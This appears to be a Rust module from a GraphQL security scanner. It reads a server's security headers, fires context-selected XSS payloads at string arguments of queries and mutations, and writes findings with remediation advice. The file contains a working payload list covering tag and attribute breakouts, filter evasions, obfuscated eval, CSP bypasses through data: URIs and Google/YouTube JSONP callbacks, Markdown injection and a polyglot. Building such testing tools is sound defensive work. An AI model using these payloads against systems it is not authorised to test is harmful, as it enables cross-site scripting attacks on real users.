use colored::Colorize;
use crate::audit::utils::effective_headers;
use crate::config::AppConfig;
use crate::transport::Transport;
use crate::types::{AffectedLocation, Confidence, EvidenceLevel, Finding, FindingStatus, GqlSchema, Severity};
use reqwest::Client;
use std::collections::HashMap;

/// Security header profile gathered from a single benign probe, used to select
/// context-appropriate XSS payloads instead of spraying the same three strings at
/// every target regardless of the rendering context.
struct XssContext {
    /// Server response Content-Type (lowercased).
    content_type: String,
    /// Content-Security-Policy header value, if present.
    csp: Option<String>,
    /// Whether `X-Content-Type-Options: nosniff` is set.
    nosniff: bool,
    /// Whether `X-XSS-Protection` is set (to anything — even `0` is a signal).
    xss_protection: Option<String>,
    /// `Access-Control-Allow-Origin` — permissive CORS makes stored XSS higher-impact.
    cors_origin: Option<String>,
    /// Whether CORS allows credentials (Access-Control-Allow-Credentials: true).
    cors_credentials: bool,
}

impl XssContext {
    /// Analyse response headers to determine the rendering context for reflected values.
    fn from_response_headers(headers: &HashMap<String, String>) -> Self {
        let get = |name: &str| {
            headers.iter()
                .find(|(k, _)| k.eq_ignore_ascii_case(name))
                .map(|(_, v)| v.clone())
        };
        let ct = get("content-type").unwrap_or_default().to_lowercase();
        let csp = get("content-security-policy");
        let nosniff = get("x-content-type-options")
            .map(|v| v.to_lowercase().contains("nosniff"))
            .unwrap_or(false);
        let xss_protection = get("x-xss-protection");
        let cors_origin = get("access-control-allow-origin");
        let cors_credentials = get("access-control-allow-credentials")
            .map(|v| v.trim().eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        Self { content_type: ct, csp, nosniff, xss_protection, cors_origin, cors_credentials }
    }

    /// Whether the response is served as HTML (not JSON/XML/plain).
    fn is_html(&self) -> bool { self.content_type.contains("html") }

    /// Whether the response is application/json (the common GraphQL case).
    fn is_json(&self) -> bool { self.content_type.contains("json") }

    /// Whether CSP blocks inline scripts (`script-src 'unsafe-inline'` missing or
    /// `'none'` / `default-src` without `'unsafe-inline'`).
    fn csp_blocks_inline(&self) -> bool {
        let csp = match &self.csp { Some(c) => c.to_lowercase(), None => return false };
        // If CSP exists but neither script-src unsafe-inline nor default-src unsafe-inline
        // is present, inline scripts are blocked.
        let has_inline = csp.contains("unsafe-inline");
        // 'none' or strict-dynamic without unsafe-inline also block.
        let has_none = csp.contains("'none'");
        has_none || (!has_inline && (csp.contains("script-src") || csp.contains("default-src")))
    }

    /// Summarise the security-relevant headers for the finding description.
    fn summary(&self) -> String {
        let mut lines = Vec::new();
        lines.push(format!("- **Content-Type**: `{}`", self.content_type));
        if let Some(csp) = &self.csp {
            let blocked = if self.csp_blocks_inline() { " (inline scripts blocked)" } else { "" };
            lines.push(format!("- **Content-Security-Policy**: `{}`{}", csp, blocked));
        }
        if self.nosniff { lines.push("- **X-Content-Type-Options**: `nosniff` (MIME sniffing blocked)".into()); }
        if let Some(xp) = &self.xss_protection { lines.push(format!("- **X-XSS-Protection**: `{}`", xp)); }
        if let Some(co) = &self.cors_origin {
            let cred = if self.cors_credentials { " with credentials" } else { "" };
            lines.push(format!("- **CORS**: `Access-Control-Allow-Origin: {}`{}", co, cred));
        }
        lines.join("\n")
    }
}

/// Build a context-appropriate payload set based on the response headers observed
/// during a benign probe. Returns (primary_payloads, secondary_payloads, context_label).
///
/// Payloads are organised by the **escaping context** they target — the same mental
/// model a manual tester uses: "what HTML construct is my input landing inside, and
/// how do I break out of it?" Each context group covers the real-world scenarios
/// encountered in XSS testing (body text, attribute value, textarea, title, style,
/// JavaScript variable, etc.).
fn build_payloads(ctx: &XssContext) -> (Vec<&'static str>, Vec<&'static str>, String) {
    // ── Escaping context: plain HTML body ──────────────────────────
    // Input lands between tags (e.g. <div>HERE</div>). Any valid HTML
    // tag is rendered directly. Script tags, img onerror, and svg
    // onload are the three most reliable single-tag vectors.
    let html_body: &[&str] = &[
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
    ];

    // ── Escaping context: HTML attribute value ─────────────────────
    // Input lands inside a quoted attribute (e.g. <input value="HERE">).
    // Payloads close the quote, close the tag, then inject script.
    let html_attr_breakout: &[&str] = &[
        "\"><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "\" onfocus=alert(1) autofocus=\"",
        "' onmouseover=alert(1) '",
        "\"><svg onload=alert(1)>",
    ];

    // ── Escaping context: <textarea> tag ───────────────────────────
    // <textarea> treats everything inside as raw text until </textarea>.
    // Breakout: close the textarea, inject payload.
    let textarea_breakout: &[&str] = &[
        "</textarea><script>alert(1)</script>",
        "</textarea><img src=x onerror=alert(1)>",
    ];

    // ── Escaping context: <title> tag ──────────────────────────────
    // Everything inside <title> is treated as the page title string.
    // Breakout: close </title>, inject payload.
    let title_breakout: &[&str] = &[
        "</title><script>alert(1)</script>",
        "</title><img src=x onerror=alert(1)>",
    ];

    // ── Escaping context: <style> tag ──────────────────────────────
    // Everything inside <style> is parsed as CSS, not HTML.
    // Breakout: close </style>, inject payload.
    let style_breakout: &[&str] = &[
        "</style><script>alert(1)</script>",
        "</style><img src=x onerror=alert(1)>",
    ];

    // ── Escaping context: JavaScript variable ──────────────────────
    // Input lands inside a JS string: var x = 'HERE'; or `HERE`.
    // Breakout: close the quote/semicolon, call alert, comment the tail.
    let js_var_breakout: &[&str] = &[
        "';alert(1);//",
        "';alert(1);var x='",
        "\";alert(1);//",
        "`;alert(1);//",
        "');alert(1);//",
    ];

    // ── Filter evasion: script-tag blocked ─────────────────────────
    // Backend strips or rejects <script> specifically. Use alternative
    // tags that can execute JavaScript without the word "script".
    let no_script_tag: &[&str] = &[
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<iframe src=\"javascript:alert(1)\">",
    ];

    // ── Filter evasion: case-sensitive script filter ───────────────
    // Backend blocks only lowercase "<script>". Mixed-case bypasses.
    let case_bypass: &[&str] = &[
        "<sCRiPt>alert(1)</sCrIpT>",
        "<ScRiPt>alert(1)</ScRiPt>",
    ];

    // ── Filter evasion: first-occurrence filter ────────────────────
    // Backend only removes the FIRST <script> pair. Sacrificial first
    // tag absorbs the filter; the second tag executes.
    let sacrificial_script: &[&str] = &[
        "<script></script><script>alert(1)</script>",
        "<script>x</script><img src=x onerror=alert(1)>",
    ];

    // ── Filter evasion: encoded/obfuscated payload ─────────────────
    // eval() with toString(30) encoding hides the payload from static
    // string-matching filters. "confirm" → 8680439..toString(30).
    let obfuscated: &[&str] = &[
        "<script>eval(8680439..toString(30))(1)</script>",
    ];

    // ── No closing bracket (unclosed tag) ──────────────────────────
    // Some filters strip > but not ; . Close the attribute with ; so
    // the payload still fires.
    let unclosed_tag: &[&str] = &[
        "<img src=x onerror=javascript:alert(1);",
        "<svg onload=javascript:alert(1);",
    ];

    // ── CSP bypass: data: URI ──────────────────────────────────────
    // When script-src includes 'data:', a data URI can carry the script
    // payload inline without needing an external host.
    let csp_data_uri: &[&str] = &[
        "<script src=\"data:text/javascript,alert(1)\"></script>",
    ];

    // ── CSP bypass: event handlers ─────────────────────────────────
    // CSP may block <script> but not onerror/onload/onfocus attributes
    // unless 'unsafe-hashes' is used. Most policies don't cover these.
    let csp_event_handlers: &[&str] = &[
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ];

    // ── CSP bypass: trusted JSONP endpoint ─────────────────────────
    // When script-src whitelists a large third-party domain (google.com,
    // youtube.com), their JSONP endpoints can be abused via the callback
    // parameter to execute arbitrary JavaScript.
    let csp_jsonp: &[&str] = &[
        "<script src=\"https://www.google.com/complete/search?client=chrome&q=x&callback=alert\"></script>",
        "<script src=\"https://www.youtube.com/oembed?url=x&format=json&callback=alert\"></script>",
    ];

    // ── Markdown-injection context ─────────────────────────────────
    // Input is parsed as Markdown then rendered as HTML. Fenced code
    // blocks can smuggle attributes, and image links can carry onerror.
    let markdown_xss: &[&str] = &[
        "```javascript\"onmouseover=\"alert(1)\n```",
        "![x](\"onerror=\"alert(1))",
        "[click](javascript:alert(1))",
    ];

    // ── JSON context — stored/DOM leads (not directly executable) ───
    let json_lead: &[&str] = &[
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
    ];
    // ── Universal polyglot (multi-context breakout) ─────────────────
    // A single payload designed to break out of script, style, title,
    // textarea, xmp, and comment contexts in one shot. Acts as a
    // fallback when the specific context is unknown.
    let polyglot: &[&str] = &[
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    ];

    // ── Assemble the payload set based on observed headers ──────────
    let mut primary: Vec<&str> = Vec::new();
    let label: String;

    if ctx.is_html() && ctx.csp_blocks_inline() {
        // HTML response with CSP blocking inline scripts.
        // Prioritise event-handlers, data: URIs, and JSONP bypasses
        // (inline <script> won't execute).
        primary.extend(csp_event_handlers);
        primary.extend(csp_data_uri);
        primary.extend(csp_jsonp);
        primary.extend(html_attr_breakout);
        primary.extend(textarea_breakout);
        primary.extend(title_breakout);
        primary.extend(style_breakout);
        label = format!("HTML + CSP inline-blocked ({})", ctx.content_type);
    } else if ctx.is_html() {
        // HTML response — full coverage across all escaping contexts.
        // Organised by likelihood: body first (most common), then
        // attribute breakouts, then specific tag contexts, then
        // JavaScript variable context, filter evasions last.
        primary.extend(html_body);
        primary.extend(html_attr_breakout);
        primary.extend(textarea_breakout);
        primary.extend(title_breakout);
        primary.extend(style_breakout);
        primary.extend(js_var_breakout);
        primary.extend(no_script_tag);
        primary.extend(case_bypass);
        primary.extend(sacrificial_script);
        primary.extend(unclosed_tag);
        primary.extend(obfuscated);
        primary.extend(markdown_xss);
        label = format!("HTML ({})", ctx.content_type);
    } else if ctx.is_json() {
        // JSON response — stored/DOM XSS leads. Include body and
        // attribute breakouts since the value may later render in HTML.
        primary.extend(json_lead);
        primary.extend(html_attr_breakout);
        primary.extend(js_var_breakout);
        primary.extend(markdown_xss);
        label = format!("JSON ({}) — stored/DOM lead, verify HTML sink", ctx.content_type);
    } else {
        // Unknown Content-Type — use polyglots plus the most portable
        // single-tag payloads.
        primary.extend(polyglot);
        primary.extend(html_body);
        primary.extend(html_attr_breakout);
        label = format!("unknown Content-Type ({}) — polyglot + body payloads", ctx.content_type);
    }

    // Secondary (fallback) payloads: polyglots for stubborn contexts
    // that didn't trigger on the primary set.
    let secondary: Vec<&str> = polyglot.to_vec();

    // Deduplicate while preserving order.
    let mut seen = std::collections::HashSet::new();
    primary.retain(|p| seen.insert(*p));

    (primary, secondary, label)
}

pub async fn probe_xss(
    schema: &GqlSchema,
    url: &str,
    client: &Client,
    extra_headers: &[String],
    rate_limit_ms: u64,
    evasion_level: u8,
    config: &AppConfig,
    transport: Transport,
    ctx: &crate::audit::targets::ScopeCtx<'_>,
    confirmed: &mut Vec<Finding>,
    _unconfirmed: &mut Vec<Finding>,
) -> Result<(), String> {
    let query_name = schema.query_type.as_ref().map(|q| q.name.as_str());
    let mutation_name = schema.mutation_type.as_ref().map(|m| m.name.as_str());

    let mut targets = Vec::new();
    for (op_keyword, root_type) in [("query", query_name), ("mutation", mutation_name)] {
        for field in schema.fields_for_type(root_type) {
            if let Some(args) = &field.args {
                for arg in args {
                    let type_name = arg.arg_type.as_ref().and_then(|t| t.unwrap_type_name());
                    if let Some(tn) = type_name {
                        if tn == "String" {
                            targets.push((op_keyword, root_type.unwrap_or("?"), field, arg));
                        }
                    }
                }
            }
        }
    }

    let targets = crate::audit::targets::scope_targets_prioritized(
        targets,
        ctx.sev_index,
        ctx.scope,
        |t| (t.1.to_string(), t.2.name.clone()),
        |t| crate::audit::targets::name_affinity(
            &format!("{} {}", t.2.name, t.3.name),
            crate::audit::targets::XSS_KEYWORDS,
        ),
    );

    let headers = effective_headers(extra_headers, None, false);

    // --- Header-aware context probe ---
    // Send a benign __typename query to observe the server's security headers before
    // firing any XSS payloads. This tells us whether we're dealing with HTML, JSON,
    // whether CSP blocks inline scripts, etc. — and lets us pick payloads that match.
    let benign_resp = crate::audit::utils::post_graphql_ext(
        client, url, &headers, "{ __typename }", None,
        rate_limit_ms, evasion_level, transport, false,
    ).await?;
    let xss_ctx = XssContext::from_response_headers(&benign_resp.headers);

    // Handle edge case: if the endpoint returns no usable headers (e.g. empty map),
    // default to JSON lead payloads — the safe, common GraphQL case.
    let (primary_payloads, secondary_payloads, ctx_label) = build_payloads(&xss_ctx);

    eprintln!(
        "  {} XSS context: {} | CSP: {} | nosniff: {} | CORS: {}",
        "→".cyan(),
        ctx_label,
        xss_ctx.csp.as_deref().unwrap_or("none"),
        if xss_ctx.nosniff { "yes" } else { "no" },
        xss_ctx.cors_origin.as_deref().unwrap_or("none"),
    );

    // Flatten: try primary payloads first, then secondary (polyglots) as fallback.
    // Deduplicate so a payload that appears in both sets isn't sent twice.
    let mut all_payloads: Vec<&str> = primary_payloads;
    for p in secondary_payloads {
        if !all_payloads.contains(&p) { all_payloads.push(p); }
    }

    'targets: for (op_keyword, root_name, field, arg) in targets {
        let is_mutation = op_keyword == "mutation";
        eprintln!("  {} Testing XSS Injection on {}.{}({})...", "→".cyan(), root_name, field.name, arg.name);

        for payload in &all_payloads {
            if !ctx.budget.try_consume() { break 'targets; }

            let mut overrides: HashMap<String, serde_json::Value> = HashMap::new();
            overrides.insert(arg.name.clone(), serde_json::Value::String(payload.to_string()));
            let mut op = crate::audit::utils::build_operation_query(schema, op_keyword, field, &overrides, &config.audit.seeds, false);
            let refl = crate::audit::utils::reflective_selection(schema, field);
            if !refl.is_empty() {
                op.query = op.query.replacen("{ __typename }", &refl, 1);
            }

            let resp = crate::audit::utils::post_graphql_ext(client, url, &headers, &op.query, Some(op.variables), rate_limit_ms, evasion_level, transport, is_mutation).await?;

            let reflected_in_data = resp.data.as_ref().map(|d| d.to_string().contains(payload)).unwrap_or(false);
            let reflected_in_errors = resp.errors_text.contains(payload);
            if !reflected_in_data && !reflected_in_errors {
                continue;
            }

            if reflected_in_errors && !reflected_in_data {
                let type_error_markers = [
                    "argumentLiteralsIncompatible",
                    "Expected type",
                    "cannot represent",
                    "is not a valid",
                ];
                if type_error_markers.iter().any(|m| resp.errors_text.contains(m)) {
                    continue;
                }
            }

            let is_html = xss_ctx.is_html();
            let where_ = if reflected_in_data { "response data" } else { "error message" };
            let header_summary = xss_ctx.summary();
            let evidence_body = crate::audit::poc::truncated_body(&resp.raw_text, 500);

            if is_html {
                confirmed.push(Finding {
                    id: "xss-reflection",
                    severity: Severity::High,
                    title: "Cross-Site Scripting (XSS) Reflection Confirmed",
                    description: format!(
                        "### Analysis\n\
                         The payload was reflected unescaped in a response **served as HTML** \
                         (`Content-Type: {}`), so it executes in the browser — a confirmed reflected XSS.\n\n\
                         ### Response Headers\n{}\n\n\
                         ### Evidence\n\
                         - **Reflected Payload**: `{}`\n\
                         - **Reflection Point**: {} (HTML response)\n\
                         - **Source Field**: `{}.{}({})`\n\
                         - **Response body**:\n```\n{}\n```",
                        xss_ctx.content_type, header_summary,
                        payload, where_, root_name, field.name, arg.name,
                        evidence_body,
                    ),
                    affected: vec![AffectedLocation::Argument(root_name.into(), field.name.clone(), arg.name.clone())],
                    remediation: "Context-encode all user input before rendering it in HTML. Do not reflect raw input into HTML responses.",
                    first_step: Some(format!("Execute the PoC and confirm `{}` renders unescaped in the HTML response.", payload)),
                    references: vec!["CWE-79: Cross-site Scripting", "OWASP API8: Injection"],
                    status: FindingStatus::Confirmed,
                    confidence: Confidence::Confirmed,
                    evidence_level: EvidenceLevel::Executed,
                    poc: Some(op.query),
                });
            } else {
                // JSON / unknown context: report as a lead. Include the header context
                // so the analyst knows what protections (CSP, CORS, nosniff) are in play
                // when they manually verify the HTML sink.
                let cors_note = if xss_ctx.cors_credentials {
                    "\n\n⚠ **CORS with credentials is enabled** — if this value is stored and reflected in an HTML sink, an attacker can exfiltrate data cross-origin."
                } else if xss_ctx.cors_origin.as_deref() == Some("*") {
                    "\n\n⚠ **CORS allows any origin** — if this value is stored and reflected in HTML, cross-origin data access is possible."
                } else {
                    ""
                };
                let csp_note = if xss_ctx.csp_blocks_inline() {
                    "\n\nℹ **CSP blocks inline scripts** — even in an HTML sink, inline `<script>` won't execute. Test CSP-bypass vectors (DOM clobbering, `script-src` bypass via JSONP endpoints, or dangling markup)."
                } else {
                    ""
                };

                confirmed.push(Finding {
                    id: "xss-reflected-input",
                    severity: Severity::Low,
                    title: "Reflected Input — Potential Stored/DOM XSS (verify HTML sink)",
                    description: format!(
                        "### Analysis\n\
                         The payload `{}` was echoed back **unmodified** in the {} for `{}.{}({})`. \
                         Reflection in a `{}` API response is **not** XSS on its own — but if this value is later \
                         rendered in an HTML context (an admin dashboard, the app's own web UI, an API explorer) \
                         without escaping, it becomes **stored or DOM-based XSS**. This is a lead to verify, not a \
                         confirmed vulnerability.\n\n\
                         ### Response Headers\n{}\n\n\
                         ### Evidence\n\
                         - **Reflected Payload**: `{}`\n\
                         - **Reflection Point**: {} ({} — not directly executable)\n\
                         - **Source Field**: `{}.{}({})`\n\
                         - **Response body**:\n```\n{}\n```{}{}",
                        payload, where_, root_name, field.name, arg.name,
                        xss_ctx.content_type,
                        header_summary,
                        payload, where_, xss_ctx.content_type, root_name, field.name, arg.name,
                        evidence_body,
                        csp_note, cors_note,
                    ),
                    affected: vec![AffectedLocation::Argument(root_name.into(), field.name.clone(), arg.name.clone())],
                    remediation: "Context-encode this value wherever it is rendered (HTML/JS/attribute). Do not rely on the JSON transport to neutralize reflected input.",
                    first_step: Some(format!("Submit this payload, then check whether `{}` is displayed unescaped anywhere the app renders it as HTML (its web UI, a dashboard).", arg.name)),
                    references: vec!["CWE-79: Cross-site Scripting", "OWASP API8: Injection"],
                    status: FindingStatus::Possible,
                    confidence: Confidence::Possible,
                    evidence_level: EvidenceLevel::Inferred,
                    poc: Some(op.query),
                });
            }
            break;
        }
    }

    Ok(())
}
